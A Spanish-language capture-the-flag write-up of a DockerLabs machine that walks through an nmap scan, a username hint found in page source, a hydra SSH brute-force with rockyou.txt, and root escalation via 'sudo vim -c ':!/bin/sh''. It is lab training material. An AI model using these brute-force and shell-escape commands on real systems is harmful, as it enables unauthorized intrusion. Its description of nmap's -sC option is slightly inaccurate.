# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/212ec7fd-e551-47c5-8036-f3998c3dbff2)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **21/tcp (FTP ):** vsftpd 3.0.5
2. **22/tcp (SSH ):** OpenSSH 9.6p1
3. **80/tcp (HTTP ):** Apache httpd 2.4.58 

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a una pagina de entrenamiento personalizado.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/546741b9-bd2a-4815-9adb-655637dd5f38)

# Fase 2- Exploración

#### Codigo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/11ebdb70-03cb-40fd-9c26-69898dfeffbf)

En la linea 52 del codigo de la pagina vemos un mensaje: 
```
<! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
```
Una pista...

#### Russoski
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7deff97e-e22a-40d3-bae1-8b8f48856192)

En la pagina encontramos un posible usuario...

# Fase 3- Explotación

#### Hydra
Usamos hydra para realizar fuerza bruta al protocolo ssh, Comando utilizado:
```python
❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f2281fcb-0590-4874-b5db-109c2b0367ce)
Y nos encontró la contraseña.

# Fase 4- Privilegios

#### Sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/19983b64-542e-4713-b95f-291ec7c6e14a)

Despues de realizar el tratamiento de la TTY, vemos que podemos ejecutar el binario `vim` como usuario `root`.

#### Vim
Para escalar utilizando este binario, tenemos que ejecutar el comando:
```python
> sudo vim -c ':!/bin/sh'
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8224e506-fbc6-4484-9f59-479194c1c0cb)
Y somos el usuario root!.

